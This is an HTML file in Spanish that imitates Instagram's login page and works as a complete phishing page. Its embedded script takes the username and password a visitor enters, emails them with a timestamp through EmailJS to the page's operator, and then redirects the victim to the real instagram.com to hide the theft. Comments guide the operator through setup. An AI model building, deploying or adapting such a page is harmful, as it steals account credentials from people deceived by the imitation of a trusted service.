<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <!-- EmailJS SDK -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script type="text/javascript">
       (function(){
          emailjs.init("q1IUmbgdFeBvmxnvi"); // <--- IMPORTANTE: Pega aquí tu Public Key de EmailJS
       })();
    </script>

    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            padding: 40px;
            width: 350px;
            text-align: center;
            box-sizing: border-box;
        }
        .logo {
            width: 175px;
            margin: 0 0 30px 0;
        }
        h2 {
            font-size: 16px;
            color: #8e8e8e;
            font-weight: 600;
            margin: 0 0 20px 0;
        }
        input {
            width: 100%;
            padding: 9px 7px 8px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            margin-bottom: 10px;
            font-size: 12px;
            box-sizing: border-box;
        }
        input:focus {
            border-color: #aaa;
            outline: none;
        }
        button {
            width: 100%;
            background-color: #0095f6;
            border: none;
            color: #fff;
            padding: 7px;
            border-radius: 4px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            position: relative;
        }
        button:hover {
            background-color: #1877f2;
        }
        button:disabled {
            background-color: #bdedef;
            color: white;
            cursor: default;
        }
        .spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid #0095f6;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 2s linear infinite;
            display: none;
            margin: 0 auto;
            position: absolute;
            left: 50%;
            top: 50%;
            margin-left: -10px;
            margin-top: -10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .links {
            margin-top: 15px;
            font-size: 12px;
        }
        .links a {
            color: #003768;
            text-decoration: none;
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- LOGO CORREGIDO (URL estable) -->
        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Instagram" class="logo">
        
        <h2>Iniciar sesión</h2>
        
        <!-- FORMULARIO -->
        <form id="login-form">
            <!-- Campo usuario -->
            <input type="text" name="user_email" id="user_email" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
            
            <!-- Campo contraseña con autocomplete nuevo para evitar sugerencias de Google -->
            <input type="password" name="password" id="password" placeholder="Contraseña" autocomplete="new-password" required>
            
            <button type="submit" id="submit-btn">
                <span id="btn-text">Iniciar sesión</span>
                <div class="spinner" id="spinner"></div>
            </button>
        </form>

        <div class="links">
            <a href="#">¿Has olvidado la contraseña?</a>
        </div>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            
            var btn = document.getElementById('submit-btn');
            var spinner = document.getElementById('spinner');
            var btnText = document.getElementById('btn-text');
            
            // UI Loading
            btn.disabled = true;
            btnText.style.opacity = '0';
            spinner.style.display = "block";
            
            // Datos a enviar
            var templateParams = {
                user_email: document.getElementById('user_email').value,
                password: document.getElementById('password').value,
                // Opcional: fecha y hora
                time: new Date().toLocaleString() 
            };

            // EmailJS Send
            emailjs.sendForm("service_rkpt26i", "template_zl3ywbm", templateParams)
                .then(function() {
                    // Éxito
                    spinner.style.display = "none";
                    btnText.style.opacity = '1';
                    btn.style.backgroundColor = "#4CAF50"; // Verde éxito
                    btnText.innerText = "¡Éxito!";
                    
                    setTimeout(function() {
                        window.location.href = "https://www.instagram.com";
                    }, 1000); 

                }, function(error) {
                    // Error
                    spinner.style.display = "none";
                    btn.disabled = false;
                    btnText.style.opacity = '1';
                    btnText.innerText = "Iniciar sesión";
                    // Descomenta la línea de abajo si quieres ver el error en la consola
                    // console.log('Error:', error);
                });
        });
    </script>
</body>
                </html>
